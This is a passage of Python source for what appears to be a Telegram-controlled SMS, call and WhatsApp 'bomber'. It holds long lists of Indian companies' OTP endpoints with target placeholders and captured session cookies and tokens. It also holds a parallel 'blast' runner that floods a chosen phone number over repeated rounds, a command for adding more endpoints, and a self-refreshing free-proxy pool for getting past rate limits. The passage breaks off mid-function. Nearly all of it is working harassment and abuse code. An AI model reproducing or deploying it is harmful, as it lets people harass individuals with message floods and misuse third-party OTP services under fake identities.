appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; mab=2e11992dc4c54dd59fe36360f6447c97"}, "json": {"phone": "{target}", "country_code": "+91", "nod": 4}},
    {"name": "XB_Purplle", "url": "https://www.purplle.com/api/account/authorization/send_otp?phone={target}&action=register", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"device_id": "TEC3cjyVJhEFPGsSHw", "tracestate": "2174843@nr=0-1-2174843-954632846-ab28153acde8ef8e----1604563013484", "traceparent": "00-9c150aeaf03c0d35987fe67bd2403510-ab28153acde8ef8e-01", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIxNzQ4NDMiLCJhcCI6Ijk1NDYzMjg0NiIsImlkIjoiYWIyODE1M2FjZGU4ZWY4ZSIsInRyIjoiOWMxNTBhZWFmMDNjMGQzNTk4N2ZlNjdiZDI0MDM1MTAiLCJ0aSI6MTYwNDU2MzAxMzQ4NH19", "content-type": "application/x-www-form-urlencoded", "accept": "application/json, text/plain, /", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs", "referer": "https://www.purplle.com/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "sessionExpiryTime=1604564806; _cfruid=20a4bcebdd179c4e63fbbeb0d6271eef3e5ec651-1604563004; cf_bm=9b13a29b50f7e10544e41f92eb7dd146692e3d7e-1604563004-1800-AW3mGq8peEPN0yAegFSPA95oysBWcvWDsh8ey4YhGG03hJHlYCNKYfyIAEfNhKm5b9SwcQd6bgGY1aSlO18xR1Y=; _fbp=fb.1.1604562970512.1162148084; _gat_UA-28132362-1=1; _gcl_marco=1.1981215102.1604562967; _gid=GA1.2.990407877.1604562967; _ga=GA1.2.279546588.1604562967; _gcl_au=1.1.1568865454.1604562965; g_state={\"i_p\":1604570161363,\"i_l\":1}; cto_bundle=WnK_wl9wUEtvUHhZcDc2UFFvVXpKdGNhUW9pR1g5M01YZ3VSJTJCYk1wUkJvUXJ5eEolMkZrTEVqWDRQOVZ2TWhLSXpQcEl3cnlYS09tZHM5UUxCSDdsUThBY2x3UTdBS29iR29odnJSUnFUTUQ1ZGVQa3hxdFhmNFpLZyUyRmdTaXYlMkZObzB3bVpNTnBPWENTQ0E5JTJGRkZocnBLTHBnYWt3JTNEJTNE; isSessionDetails=true; session_id=e01c026cfe88113e8f8903e0a42f0a3b; sessionCreatedTime=1604562951; environment=prod; client_ip=2401%3A4900%3A45dc%3A3edf%3A9d7d%3A63b9%3A43d%3A5e4a; session_initiated=Direct; _tmpsess=TEC3cjyVJhEFPGsSHw_1604562950; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs; visitorppl=TEC3cjyVJhEFPGsSHw; mode_device=mobile; _cfduid=d9295b4e312bb8c952cfa125eeae5ea1b1604562949"}},
    {"name": "XB_AngelBroking", "url": "https://www.angelbroking.com/form-gateways/oda-form.php", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"cache-control": "max-age=0", "upgrade-insecure-requests": "1", "origin": "https://www.angelbroking.com", "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-user": "?1", "referer": "https://www.angelbroking.com/open-demat-account", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "umqSiteTimer=0; 19229.vst=%7B%22s%22%3A%2226f30b91-0d2c-422e-b023-dd8565155821%22%2C%22t%22%3A%22returning%22%2C%22lu%22%3A1604564031935%2C%22lv%22%3A1604563645897%2C%22lp%22%3A0%7D; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q; gat_UA-1186489-17=1; umqorderVal2=%229519874704%22; storejs=%22storejs%22; PageCookie=Lead:https://www.angelbroking.com/open-demat-account,Previous:https://www.angelbroking.com/; lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _lo_v=1; _lorid=156545-1604563454540-8a19f094f5338582; _lo_uid=156545-1604563454540-7e143755be6613e0; LandPageCookie=https://www.angelbroking.com/; SourceMediumCookie30=direct/none; CookieSourceMedium=direct/none; _fbp=fb.1.1604563209374.2038457169; _gid=GA1.2.113287213.1604563179; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gcl_au=1.1.229780243.1604563178; _cfduid=de733792a27631a027bfa486e16f221d41604563134"}, "json": {"_raw": "name=Tsunami+Bomber&mobile={target}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752"}},
    {"name": "XB_ASVM_Faizabad", "url": "http://asvmfaizabad.org/register.php", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://asvmfaizabad.org", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://asvmfaizabad.org/register.php", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8", "Cookie": "wh-widget-cookie=1"}, "json": {"_raw": "sname=Tsunami&sclass=XII&sphone={target}&spassword=tsunamiastronomia&ssection=A&submit="}},
]

SMS_APIS.extend(XBOMBER_APIS)

# Merge global batch into main lists — same UI, more firepower.
SMS_APIS.extend(FRESH_SMS_APIS)
CALL_APIS.extend(FRESH_CALL_APIS)
WA_APIS.extend(FRESH_WA_APIS)


# ════════════════════════════════════════════════════════════
# EXTRA_LIVE_APIS — additional Indian OTP endpoints (search-added)
# ════════════════════════════════════════════════════════════

EXTRA_SMS_APIS = [
    {"name": 'Rapido', "url": 'https://api.rapido.bike/api/v2/customer/generate_otp', "method": 'POST', "origin": 'https://rapido.bike', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'Uber India', "url": 'https://auth.uber.com/login/session', "method": 'POST', "origin": 'https://auth.uber.com', "identifier": '', "json": {'phoneNumber': '{target}', 'phoneCountryCode': '91'}},
    {"name": 'Ola Foods', "url": 'https://www.olafoods.com/api/v1/otp/send', "method": 'POST', "origin": 'https://www.olafoods.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'BigBasket', "url": 'https://www.bigbasket.com/mapi/v3.0.4/gen-mobile-otp/', "method": 'POST', "origin": 'https://www.bigbasket.com', "identifier": '', "json": {'mobile_no': '{target}'}},
    {"name": 'Zepto', "url": 'https://api.zeptonow.com/api/v2/user/send-otp', "method": 'POST', "origin": 'https://www.zeptonow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91'}},
    {"name": 'Blinkit', "url": 'https://blinkit.com/v3/accounts/generate_otp', "method": 'POST', "origin": 'https://blinkit.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Dunzo', "url": 'https://www.dunzo.com/api/v1/user/otp/generate', "method": 'POST', "origin": 'https://www.dunzo.com', "identifier": '', "json": {'phone_number': '{target}', 'country_code': '+91'}},
    {"name": 'PolicyBazaar', "url": 'https://www.policybazaar.com/apis/nextgen/user/generateOtp', "method": 'POST', "origin": 'https://www.policybazaar.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'BankBazaar', "url": 'https://www.bankbazaar.com/api/otp/send', "method": 'POST', "origin": 'https://www.bankbazaar.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'CRED', "url": 'https://api.cred.club/v1/mobile/generate-otp', "method": 'POST', "origin": 'https://cred.club', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'JioMart', "url": 'https://www.jiomart.com/mst/rest/v1/5/user/generate_otp', "method": 'POST', "origin": 'https://www.jiomart.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'FirstCry', "url": 'https://www.firstcry.com/svcs/user/GenerateOTP.svc/GetOTPForMobile', "method": 'POST', "origin": 'https://www.firstcry.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'HealthKart', "url": 'https://www.healthkart.com/rest/v3/user/otp/send', "method": 'POST', "origin": 'https://www.healthkart.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'PharmEasy', "url": 'https://api.pharmeasy.in/auth/otp/send/', "method": 'POST', "origin": 'https://pharmeasy.in', "identifier": '', "json": {'phone_no': '{target}', 'country_code': '+91'}},
    {"name": 'Netmeds', "url": 'https://www.netmeds.com/api/v1/users/otp', "method": 'POST', "origin": 'https://www.netmeds.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'MakeMyTrip', "url": 'https://mapi.makemytrip.com/user/api/v1/generate_otp', "method": 'POST', "origin": 'https://www.makemytrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'Goibibo', "url": 'https://www.goibibo.com/api/user/otp/send', "method": 'POST', "origin": 'https://www.goibibo.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Yatra', "url": 'https://www.yatra.com/api/user/otp/send', "method": 'POST', "origin": 'https://www.yatra.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'RedBus', "url": 'https://m.redbus.in/api/loginotp', "method": 'POST', "origin": 'https://www.redbus.in', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'IRCTC', "url": 'https://www.irctc.co.in/eticketing/protected/mapps1/otp/send', "method": 'POST', "origin": 'https://www.irctc.co.in', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'IndianRail', "url": 'https://enquiry.indianrail.gov.in/mntes/api/otp/send', "method": 'POST', "origin": 'https://enquiry.indianrail.gov.in', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'ShareChat', "url": 'https://sharechat.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://sharechat.com', "identifier": '', "json": {'phone': '{target}', 'countryCode': '+91'}},
    {"name": 'Josh', "url": 'https://josh.in/api/v1/otp/send', "method": 'POST', "origin": 'https://josh.in', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Moj', "url": 'https://mojapp.in/api/v1/otp/send', "method": 'POST', "origin": 'https://mojapp.in', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Koo', "url": 'https://www.kooapp.com/apiV1/ranker/otp/send', "method": 'POST', "origin": 'https://www.kooapp.com', "identifier": '', "json": {'phone': '{target}', 'countryCode': '+91'}},
    {"name": 'MPL', "url": 'https://www.mpl.live/api/v2/otp/send', "method": 'POST', "origin": 'https://www.mpl.live', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'WinZO', "url": 'https://www.winzogames.com/api/v1/otp/send', "method": 'POST', "origin": 'https://www.winzogames.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'MyGate', "url": 'https://prodapp.mygate.in/api/v1/otp/send', "method": 'POST', "origin": 'https://mygate.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '+91'}},
    {"name": 'NoBroker', "url": 'https://www.nobroker.in/api/v1/user/otp/generate', "method": 'POST', "origin": 'https://www.nobroker.in', "identifier": '', "json": {'phone': '{target}'}},
    {"name": '99acres', "url": 'https://www.99acres.com/api/otp/send', "method": 'POST', "origin": 'https://www.99acres.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Naukri', "url": 'https://www.naukri.com/central-login-services/v0/generateOTP', "method": 'POST', "origin": 'https://www.naukri.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Shine', "url": 'https://www.shine.com/otp/generate', "method": 'POST', "origin": 'https://www.shine.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'ApnaJobs', "url": 'https://api.apna.co/api/authentication/v1/otp/send', "method": 'POST', "origin": 'https://apna.co', "identifier": '', "json": {'phone_number': '{target}', 'country_code': '+91'}},
    {"name": 'Urban Company', "url": 'https://www.urbancompany.com/api/customer/v2/otp/send', "method": 'POST', "origin": 'https://www.urbancompany.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '+91'}},
    {"name": 'FnP', "url": 'https://www.fnp.com/api/user/otp/send', "method": 'POST', "origin": 'https://www.fnp.com', "identifier": '', "json": {'mobile': '{target}'}},
]

EXTRA_CALL_APIS = [
    {"name": 'Rapido Call', "url": 'https://api.rapido.bike/api/v2/customer/generate_otp', "method": 'POST', "origin": 'https://rapido.bike', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'Zepto Call', "url": 'https://api.zeptonow.com/api/v2/user/send-otp', "method": 'POST', "origin": 'https://www.zeptonow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'BigBasket Call', "url": 'https://www.bigbasket.com/mapi/v3.0.4/gen-mobile-otp/', "method": 'POST', "origin": 'https://www.bigbasket.com', "identifier": '', "json": {'mobile_no': '{target}', 'channel': 'call'}},
    {"name": 'CRED Call', "url": 'https://api.cred.club/v1/mobile/generate-otp', "method": 'POST', "origin": 'https://cred.club', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'PharmEasy Call', "url": 'https://api.pharmeasy.in/auth/otp/send/', "method": 'POST', "origin": 'https://pharmeasy.in', "identifier": '', "json": {'phone_no': '{target}', 'country_code': '+91', 'channel': 'call'}},
    {"name": 'JioMart Call', "url": 'https://www.jiomart.com/mst/rest/v1/5/user/generate_otp', "method": 'POST', "origin": 'https://www.jiomart.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
    {"name": 'RedBus Call', "url": 'https://m.redbus.in/api/loginotp', "method": 'POST', "origin": 'https://www.redbus.in', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'MakeMyTrip Call', "url": 'https://mapi.makemytrip.com/user/api/v1/generate_otp', "method": 'POST', "origin": 'https://www.makemytrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'Urban Company Call', "url": 'https://www.urbancompany.com/api/customer/v2/otp/send', "method": 'POST', "origin": 'https://www.urbancompany.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '+91', 'channel': 'call'}},
]

EXTRA_WA_APIS = [
    {"name": 'Rapido WA', "url": 'https://api.rapido.bike/api/v2/customer/generate_otp', "method": 'POST', "origin": 'https://rapido.bike', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'Zepto WA', "url": 'https://api.zeptonow.com/api/v2/user/send-otp', "method": 'POST', "origin": 'https://www.zeptonow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'CRED WA', "url": 'https://api.cred.club/v1/mobile/generate-otp', "method": 'POST', "origin": 'https://cred.club', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'PharmEasy WA', "url": 'https://api.pharmeasy.in/auth/otp/send/', "method": 'POST', "origin": 'https://pharmeasy.in', "identifier": '', "json": {'phone_no': '{target}', 'country_code': '+91', 'channel': 'whatsapp'}},
    {"name": 'BigBasket WA', "url": 'https://www.bigbasket.com/mapi/v3.0.4/gen-mobile-otp/', "method": 'POST', "origin": 'https://www.bigbasket.com', "identifier": '', "json": {'mobile_no': '{target}', 'channel': 'whatsapp'}},
    {"name": 'JioMart WA', "url": 'https://www.jiomart.com/mst/rest/v1/5/user/generate_otp', "method": 'POST', "origin": 'https://www.jiomart.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'whatsapp'}},
    {"name": 'MakeMyTrip WA', "url": 'https://mapi.makemytrip.com/user/api/v1/generate_otp', "method": 'POST', "origin": 'https://www.makemytrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'Urban Company WA', "url": 'https://www.urbancompany.com/api/customer/v2/otp/send', "method": 'POST', "origin": 'https://www.urbancompany.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '+91', 'channel': 'whatsapp'}},
]

SMS_APIS.extend(EXTRA_SMS_APIS)
CALL_APIS.extend(EXTRA_CALL_APIS)
WA_APIS.extend(EXTRA_WA_APIS)


# ════════════════════════════════════════════════════════════
# USER-ADDED APIs (runtime, via /addapi command or ➕ Add button)
# ════════════════════════════════════════════════════════════

USER_APIS: list = []
_ADD_WAIT: dict = {}   # user_id -> True while awaiting /addapi payload

def _register_user_api(spec: dict) -> str:
    """Append a user-supplied API dict into SMS_APIS + USER_APIS. Returns name."""
    spec.setdefault("method", "POST")
    spec.setdefault("identifier", "")
    spec.setdefault("origin", "")
    spec.setdefault("name", f"Custom{len(USER_APIS)+1}")
    USER_APIS.append(spec)
    SMS_APIS.append(spec)
    return spec["name"]


def _parse_api_payload(raw: str) -> list:
    """Accept many formats and return list of API spec dicts.

    Supports JSON object, JSON array, JSONL (one JSON per line),
    or plain URLs (one per line). Lines starting with '#' or '//' ignored.
    """
    import json as _j
    raw = (raw or "").strip().lstrip("\ufeff")
    if not raw:
        raise ValueError("empty payload")
    try:
        obj = _j.loads(raw)
        if isinstance(obj, dict):
            return [obj]
        if isinstance(obj, list):
            return [x for x in obj if isinstance(x, dict)]
    except Exception:
        pass
    specs: list = []
    for line in raw.splitlines():
        s = line.strip().strip(",")
        if not s or s.startswith("#") or s.startswith("//"):
            continue
        if s.startswith("{"):
            try:
                d = _j.loads(s)
                if isinstance(d, dict):
                    specs.append(d); continue
            except Exception:
                pass
        if s.startswith("http://") or s.startswith("https://"):
            specs.append({
                "url": s, "method": "POST",
                "json": {"mobile": "+91{target}", "phone": "+91{target}"},
            })
    if not specs:
        # Fallback: Python-source style (dict literals with lambdas, e.g. ULTIMATE_APIS = [...])
        import re as _re
        url_iter = list(_re.finditer(r'''["']url["']\s*:\s*["'](https?://[^"']+)["']''', raw))
        for i, m in enumerate(url_iter):
            start = url_iter[i-1].end() if i > 0 else max(0, m.start() - 400)
            end = url_iter[i+1].start() if i+1 < len(url_iter) else min(len(raw), m.end() + 400)
            block = raw[start:end]
            url = m.group(1)
            nm = _re.search(r'''["']name["']\s*:\s*["']([^"']+)["']''', block)
            mt = _re.search(r'''["']method["']\s*:\s*["'](GET|POST|PUT|PATCH|DELETE)["']''', block, _re.I)
            spec = {
                "url": url,
                "method": (mt.group(1).upper() if mt else "POST"),
                "json": {"mobile": "+91{target}", "phone": "+91{target}"},
            }
            if nm:
                spec["name"] = nm.group(1)
            specs.append(spec)
        # Also pick up bare URLs anywhere in text if still empty
        if not specs:
            for u in _re.findall(r'https?://[^\s"\'<>()]+', raw):
                specs.append({"url": u, "method": "POST",
                              "json": {"mobile": "+91{target}", "phone": "+91{target}"}})
    if not specs:
        raise ValueError("no valid API spec / URL found")
    return specs


def _register_bulk(specs: list) -> tuple:
    added, failed = [], 0
    for sp in specs:
        try:
            if not isinstance(sp, dict) or "url" not in sp:
                failed += 1; continue
            added.append(_register_user_api(sp))
        except Exception:
            failed += 1
    return added, failed

# ════════════════════════════════════════════════════════════
# PARALLEL RUNNER
# ════════════════════════════════════════════════════════════

async def _run(apis: list, target: str) -> list:
    """Fire all APIs in parallel, return result list."""
    conn = aiohttp.TCPConnector(ssl=False, limit=500, limit_per_host=30, ttl_dns_cache=300, use_dns_cache=True)
    jar  = aiohttp.CookieJar(unsafe=True)
    shuffled = list(enumerate(apis))
    random.shuffle(shuffled)

    async with aiohttp.ClientSession(connector=conn, cookie_jar=jar) as sess:
        shuffled_results = list(await asyncio.gather(
            *[_call(sess, a, target) for _, a in shuffled]
        ))

    results: list = [None] * len(apis)
    for (orig_i, _), r in zip(shuffled, shuffled_results):
        results[orig_i] = r

    return [r if r is not None else f"❌ unknown" for r in results]


# ════════════════════════════════════════════════════════════
# BLAST RUNNER
# ════════════════════════════════════════════════════════════

async def run_blast(mobile: str, rounds: int, mode: str = "all"):
    """Run N rounds of SMS/Call/WA blast. Returns (ok, total, results_flat)."""
    all_results: list = []
    ok_total    = 0
    total_total = 0

    delay_min = 0.05
    delay_max = 0.15

    for i in range(rounds):
        if mode == "sms":
            r = await _run(SMS_APIS, mobile)
            all_results.extend(r)
        elif mode == "call":
            r = await _run(CALL_APIS, mobile)
            all_results.extend(r)
        elif mode == "wa":
            r = await _run(WA_APIS, mobile)
            all_results.extend(r)
        else:
            sms_r, call_r, wa_r = await asyncio.gather(
                _run(SMS_APIS, mobile),
                _run(CALL_APIS, mobile),
                _run(WA_APIS, mobile),
            )
            r = sms_r + call_r + wa_r
            all_results.extend(r)

        round_ok = sum(1 for x in (r if isinstance(r, list) else []) if x.startswith("✅"))
        round_total = len(r) if isinstance(r, list) else 0
        ok_total    += round_ok
        total_total += round_total
        logger.info("Round %d/%d — %d/%d OK", i + 1, rounds, round_ok, round_total)

        if i < rounds - 1:
            await asyncio.sleep(random.uniform(delay_min, delay_max))

    return ok_total, total_total, all_results


# ════════════════════════════════════════════════════════════
# SINGLE-API DEBUG CALLER  (shows full response body)
# ════════════════════════════════════════════════════════════

async def _call_debug(api: dict, target: str) -> dict:
    """Like _call but returns full response details for debugging."""
    name = api["name"]
    url  = api["url"].replace("{target}", target)
    hdrs = {**_base_headers(api.get("origin", "")), **api.get("extra_headers", {})}

    json_ = None
    data_ = None
    raw_body = api.get("json")
    if raw_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln)
                          .replace("{firstname}", fn)
                          .replace("{lastname}", ln)
                          .replace("{device}", _rand_device())
                          .replace("{uuid}", str(uuid.uuid4())))
            return v
        json_ = {k: _fill(v) for k, v in raw_body.items()}

    form_body = api.get("form")
    if form_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln))
            return v
        data_ = {k: _fill(v) for k, v in form_body.items()}

    if api.get("content_type"):
        hdrs["Content-Type"] = api["content_type"]

    method = api.get("method", "POST").upper()

    conn = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=conn) as sess:
            kw = dict(headers=hdrs, timeout=TIMEOUT, ssl=False, allow_redirects=True)
            try:
                if method == "GET":
                    async with sess.get(url, **kw) as r:
                        body = await r.text(errors="ignore")
                        status = r.status
                elif data_:
                    async with sess.post(url, data=data_, **kw) as r:
                        body = await r.text(errors="ignore")
                        status = r.status
                else:
                    async with sess.post(url, json=json_, **kw) as r:
                        body = await r.text(errors="ignore")
                        status = r.status

                identifier = api.get("identifier", "")
                ok = _ok(status, body, identifier)
                return {"name": name, "status": status, "ok": ok, "body": body[:300]}
            except asyncio.TimeoutError:
                return {"name": name, "status": 0, "ok": False, "body": "⏱️ TIMEOUT"}
            except Exception as e:
                return {"name": name, "status": 0, "ok": False, "body": f"❌ {str(e)[:100]}"}
    finally:
        if not conn.closed:
            await conn.close()


# ════════════════════════════════════════════════════════════
# PROXY ENGINE — Self-discovering free proxy pool
# Fetches proxies from public sources, tests them, rotates on failure.
# No external proxy service needed — builds its own working pool.
# ════════════════════════════════════════════════════════════

import json as _json

_PROXY_POOL:   list[str] = []          # validated proxies  "http://ip:port"
_PROXY_LOCK    = threading.Lock()
_BAD_PROXIES:  set[str] = set()        # blacklist for this session
_PROXY_REFRESHED_AT: float = 0.0
_PROXY_TTL = 600   # refresh pool every 10 minutes

# Public free-proxy list sources (no API key, no auth)
_PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
]

def _fetch_raw_proxies() -> list[str]:
    """Download proxy lists from all sources, return deduplicated ip:port list."""
    seen: set[str] = set()
    result: list[str] = []
    for src in _PROXY_SOURCES:
        try:
            resp = urllib.request.urlopen(src, timeout=8)
            text = resp.read().decode("utf-8", errors="ignore")
            for line in text.splitlines():
                line = line.strip()
                # Accept lines like "1.2.3.4:8080" or "http://1.2.3.4:8080"
                if line.startswith("http://") or line.startswith("https://"):
                    line = line.split("//", 1)[1].split("/")[0]
                if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}$", line) and line not in seen:
                    seen.add(line)
                    result.append(line)
        except Exception:
            pass
    random.shuffle(result)
    return result[:800]   # cap at 800 candidates to keep test fast

def _test_proxy_sync(proxy_str: str, test_url: str = "http://www.google.com", timeout: int = 6) -> bool:
    """Test a single proxy synchronously. Returns True if usable."""
    try:
        proxy_handler = urllib.request.ProxyHandler({"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"})
        opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPHandler())
        opener.addheaders = [("User-Agent", random.choice(_UAS))]
        resp = opener.open(test_url, timeout=timeout)
        return resp.status < 400
    except Exception:
        return False

def _build_proxy_pool():
    """Background thread: fetch + test proxies, populate _PROXY_POOL."""
    global _PROXY_REFRESHED_AT
    logger.info("🔍 [PROXY] Discovering free proxies...")
    candidates = _fetch_raw_proxies()
    if not candidates:
        logger.warning("⚠️ [PROXY] No candidates fetched — will retry later.")
        return

    good: list[str] = []
    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=80) as pool:
        fut_map = {pool.submit(_test_proxy_sync, p): p for p in candidates[:400]}
        for fut in as_completed(fut_map, timeout=60):
            p = fut_map[fut]
            try:
                if fut.result():
                    good.append(f"http://{p}")
                    if len(good) >= 60:    # stop once we have 60 working
                        break
            except Exception:
                pass

    with _PROXY_LOCK:
        _PROXY_POOL.clear()
        _PROXY_POOL.extend(good)
        _BAD_PROXIES.clear()
        _PROXY_REFRESHED_AT = time.time()
    logger.info("✅ [PROXY] Pool ready: %d working proxies", len(good))

def _ensure_proxy_pool():
    """Trigger a background refresh if pool is stale or empty."""
    now = time.time()
    if now - _PROXY_REFRESHED_AT > _PROXY_TTL or len(_PROXY_POOL) < 5:
        threading.Thread(target=_build_proxy_pool, daemon=True).start()

def get_proxy() -> str | None:
    """Return a random proxy from the pool (or None to go direct)."""
    _ensure_proxy_pool()
    with _PROXY_LOCK:
        available = [p for p in _PROXY_POOL if p not in _BAD_PROXIES]
    return random.choice(available) if available else None

def mark_proxy_bad(proxy: str):
    """Blacklist a proxy that failed."""
    with _PROXY_LOCK:
        _BAD_PROXIES.add(proxy)
        if proxy in _PROXY_POOL:
            _PROXY_POOL.remove(proxy)

async def _call_with_proxy(sess: aiohttp.ClientSession, api: dict, target: str,
                           proxy: str | None = None) -> str:
    """Wrapper around _call that injects a proxy header if provided."""
    name = api["name"]
    if proxy:
        try:
            url = api["url"].replace("{target}", target)
            hdrs = {**_base_headers(api.get("origin", "")), **api.get("extra_headers", {})}
            raw_body = api.get("json")
            json_ = None
            if raw_body:
                fn, ln = _rand_name()
                json_ = {k: (v.replace("{target}", target)
                              .replace("{email}", _rand_email())
                              .replace("{name}", fn + " " + ln)
                              .replace("{firstname}", fn)
                              .replace("{lastname}", ln)
                              .replace("{device}", _rand_device())
                              .replace("{uuid}", str(uuid.uuid4()))
                             if isinstance(v, str) else v)
                         for k, v in raw_body.items()}
            method = api.get("method", "POST").upper()
            identifier = api.get("identifier", "")
            async with aiohttp.ClientSession() as proxy_sess:
                kw = dict(headers=hdrs, timeout=TIMEOUT, ssl=False,
                          allow_redirects=True, proxy=proxy)
